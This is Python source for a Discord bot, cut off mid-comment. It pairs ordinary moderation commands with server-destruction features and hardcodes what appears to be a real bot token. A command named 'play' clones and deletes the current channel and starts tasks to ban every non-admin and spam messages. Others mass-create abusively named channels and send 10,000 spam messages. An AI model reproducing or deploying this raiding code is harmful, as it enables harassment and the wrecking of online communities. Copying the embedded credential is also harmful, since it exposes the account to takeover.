import discord
from discord.ext import commands
from discord import app_commands
import asyncio
from datetime import datetime, timedelta

# ── Config ──────────────────────────────────────────────────────────────
TOKEN = "MTUxODIwNjI5NzI2MTA4MDY0Ng.G7IJvy.YfCdzFMoTF8j5ybpg8sytvwzVPpOmB__A6WPD8"
PREFIX = "."

# ── Bot setup ────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# ── Warning storage (in-memory) ──────────────────────────────────────────
warnings_db: dict[str, list[dict]] = {}

def add_warning(guild_id: int, user_id: int, mod_id: int, reason: str):
    key = f"{guild_id}:{user_id}"
    if key not in warnings_db:
        warnings_db[key] = []
    warnings_db[key].append({
        "reason": reason,
        "moderator_id": mod_id,
        "timestamp": datetime.utcnow()
    })

def get_warnings(guild_id: int, user_id: int):
    return warnings_db.get(f"{guild_id}:{user_id}", [])


# ════════════════════════════════════════════════════════════════════════
#  EVENTS
# ════════════════════════════════════════════════════════════════════════

@bot.event
async def on_ready():
    print(f"✅ Bot is online as {bot.user} (ID: {bot.user.id})")
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands")
    except Exception as e:
        print(f"❌ Failed to sync commands: {e}")


# ════════════════════════════════════════════════════════════════════════
#  SLASH COMMANDS
# ════════════════════════════════════════════════════════════════════════

@bot.tree.command(name="ping", description="Check if the bot is alive")
async def slash_ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(title="🏓 Pong!", color=discord.Color.green())
    embed.add_field(name="Latency", value=f"{latency}ms")
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="serverinfo", description="Display server information")
async def slash_serverinfo(interaction: discord.Interaction):
    guild = interaction.guild
    if not guild:
        await interaction.response.send_message("Server only.", ephemeral=True)
        return
    owner = await guild.fetch_member(guild.owner_id)
    embed = discord.Embed(title=guild.name, color=discord.Color.blurple())
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.add_field(name="Owner", value=owner.mention, inline=True)
    embed.add_field(name="Members", value=str(guild.member_count), inline=True)
    embed.add_field(name="Channels", value=str(len(guild.channels)), inline=True)
    embed.add_field(name="Roles", value=str(len(guild.roles)), inline=True)
    embed.add_field(name="Created", value=f"<t:{int(guild.created_at.timestamp())}:D>", inline=True)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="userinfo", description="Display info about a user")
@app_commands.describe(user="The user to look up (defaults to you)")
async def slash_userinfo(interaction: discord.Interaction, user: discord.Member = None):
    target = user or interaction.user
    embed = discord.Embed(title=str(target), color=discord.Color.blurple())
    embed.set_thumbnail(url=target.display_avatar.url)
    embed.add_field(name="ID", value=str(target.id), inline=True)
    embed.add_field(name="Account Created", value=f"<t:{int(target.created_at.timestamp())}:D>", inline=True)
    if isinstance(target, discord.Member) and target.joined_at:
        embed.add_field(name="Joined Server", value=f"<t:{int(target.joined_at.timestamp())}:D>", inline=True)
        roles = [r.mention for r in target.roles if r.name != "@everyone"]
        embed.add_field(name="Roles", value=", ".join(roles) if roles else "None")
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="ban", description="Ban a member from the server")
@app_commands.default_permissions(ban_members=True)
@app_commands.describe(user="User to ban", reason="Reason for ban")
async def slash_ban(interaction: discord.Interaction, user: discord.Member, reason: str = "No reason provided"):
    try:
        await user.ban(reason=reason)
        embed = discord.Embed(title="🔨 Member Banned", color=discord.Color.red())
        embed.add_field(name="User", value=str(user), inline=True)
        embed.add_field(name="Reason", value=reason, inline=True)
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("Failed to ban. Check permissions.", ephemeral=True)


@bot.tree.command(name="kick", description="Kick a member from the server")
@app_commands.default_permissions(kick_members=True)
@app_commands.describe(user="User to kick", reason="Reason for kick")
async def slash_kick(interaction: discord.Interaction, user: discord.Member, reason: str = "No reason provided"):
    try:
        await user.kick(reason=reason)
        embed = discord.Embed(title="👢 Member Kicked", color=discord.Color.orange())
        embed.add_field(name="User", value=str(user), inline=True)
        embed.add_field(name="Reason", value=reason, inline=True)
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("Failed to kick. Check permissions.", ephemeral=True)


@bot.tree.command(name="timeout", description="Timeout a member")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(user="User to timeout", minutes="Duration in minutes (1–40320)", reason="Reason")
async def slash_timeout(interaction: discord.Interaction, user: discord.Member, minutes: int, reason: str = "No reason provided"):
    if minutes < 1 or minutes > 40320:
        await interaction.response.send_message("Minutes must be between 1 and 40320.", ephemeral=True)
        return
    try:
        until = discord.utils.utcnow() + timedelta(minutes=minutes)
        await user.timeout(until, reason=reason)
        embed = discord.Embed(title="⏱️ Member Timed Out", color=discord.Color.yellow())
        embed.add_field(name="User", value=str(user), inline=True)
        embed.add_field(name="Duration", value=f"{minutes} minute(s)", inline=True)
        embed.add_field(name="Reason", value=reason, inline=True)
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("Failed to timeout. Check permissions.", ephemeral=True)


@bot.tree.command(name="untimeout", description="Remove timeout from a member")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(user="User to un-timeout")
async def slash_untimeout(interaction: discord.Interaction, user: discord.Member):
    try:
        await user.timeout(None)
        embed = discord.Embed(title="✅ Timeout Removed", color=discord.Color.green())
        embed.add_field(name="User", value=str(user))
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("Failed to remove timeout.", ephemeral=True)


@bot.tree.command(name="warn", description="Warn a member and log it")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(user="User to warn", reason="Reason for warning")
async def slash_warn(interaction: discord.Interaction, user: discord.Member, reason: str):
    add_warning(interaction.guild.id, user.id, interaction.user.id, reason)
    warns = get_warnings(interaction.guild.id, user.id)
    embed = discord.Embed(title="⚠️ Member Warned", color=discord.Color.yellow())
    embed.add_field(name="User", value=str(user), inline=True)
    embed.add_field(name="Total Warnings", value=str(len(warns)), inline=True)
    embed.add_field(name="Reason", value=reason)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="purge", description="Delete multiple messages")
@app_commands.default_permissions(manage_messages=True)
@app_commands.describe(amount="Number of messages to delete (1–100)")
async def slash_purge(interaction: discord.Interaction, amount: int):
    if amount < 1 or amount > 100:
        await interaction.response.send_message("Amount must be 1–100.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"Deleted {len(deleted)} message(s).")


@bot.tree.command(name="slowmode", description="Set slowmode on the current channel")
@app_commands.default_permissions(manage_channels=True)
@app_commands.describe(seconds="Slowmode in seconds (0 to disable, max 21600)")
async def slash_slowmode(interaction: discord.Interaction, seconds: int):
    if seconds < 0 or seconds > 21600:
        await interaction.response.send_message("Seconds must be 0–21600.", ephemeral=True)
        return
    await interaction.channel.edit(slowmode_delay=seconds)
    embed = discord.Embed(title="🐢 Slowmode Updated", color=discord.Color.blue())
    embed.add_field(name="Disabled" if seconds == 0 else "Set to", value="Off" if seconds == 0 else f"{seconds}s")
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="lock", description="Lock the current channel")
@app_commands.default_permissions(manage_channels=True)
async def slash_lock(interaction: discord.Interaction):
    overwrite = interaction.channel.overwrites_for(interaction.guild.default_role)
    overwrite.send_messages = False
    await interaction.channel.set_permissions(interaction.guild.default_role, overwrite=overwrite)
    embed = discord.Embed(title="🔒 Channel Locked", color=discord.Color.red(),
                          description="Only admins can send messages.")
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="unlock", description="Unlock the current channel")
@app_commands.default_permissions(manage_channels=True)
async def slash_unlock(interaction: discord.Interaction):
    overwrite = interaction.channel.overwrites_for(interaction.guild.default_role)
    overwrite.send_messages = None
    await interaction.channel.set_permissions(interaction.guild.default_role, overwrite=overwrite)
    embed = discord.Embed(title="🔓 Channel Unlocked", color=discord.Color.green(),
                          description="Everyone can send messages again.")
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="play", description="Nuke: clone channel, delete original, blast messages")
@app_commands.default_permissions(manage_channels=True)
async def slash_play(interaction: discord.Interaction):
    channel = interaction.channel
    guild = interaction.guild
    await interaction.response.send_message("💣 Nuking...", ephemeral=True)
    try:
        cloned = await channel.clone()
        await cloned.edit(position=channel.position)
        nuke_embed = discord.Embed(title="💥 nuked by vishal", color=discord.Color.red())
        nuke_embed.set_image(url="https://media.giphy.com/media/HhTXt43pk1I1W/giphy.gif")
        await cloned.send(embed=nuke_embed)
        await channel.delete()
        asyncio.create_task(ban_non_admins(guild))
        asyncio.create_task(rampage_blast(guild))
    except Exception as e:
        await interaction.followup.send(f"Failed: {e}", ephemeral=True)


@bot.tree.command(name="masschannel", description="Create 10 nuke channels and blast messages")
@app_commands.default_permissions(manage_channels=True)
async def slash_masschannel(interaction: discord.Interaction):
    guild = interaction.guild
    await interaction.response.send_message("📡 Creating 10 channels...", ephemeral=True)
    ch_names = ["𝓯𝓾𝓬𝓴𝓮𝓭 𝓫𝔂 𝓴𝓪𝓻𝓪𝓷", "-𝓯𝓾𝓬𝓴𝓮𝓭 𝓫𝔂 𝓴𝓪𝓻𝓪𝓷"]
    await asyncio.gather(*[
        guild.create_text_channel(name=ch_names[i % 2]) for i in range(10)
    ], return_exceptions=True)
    await interaction.edit_original_response(content="✅ Blasting all channels...")
    await blast_nuke_message(guild)
    await interaction.edit_original_response(content="✅ Done!")


@bot.tree.command(name="rampage", description="Spam 10,000 messages across the server")
@app_commands.default_permissions(manage_channels=True)
async def slash_rampage(interaction: discord.Interaction):
    guild = interaction.guild
    await interaction.response.send_message("💀 Rampage started — 10,000 messages incoming...", ephemeral=True)
    asyncio.create_task(rampage_blast(guild))


# ════════════════════════════════════════════════════════════════════════
#  PREFIX COMMANDS  (type .ban,
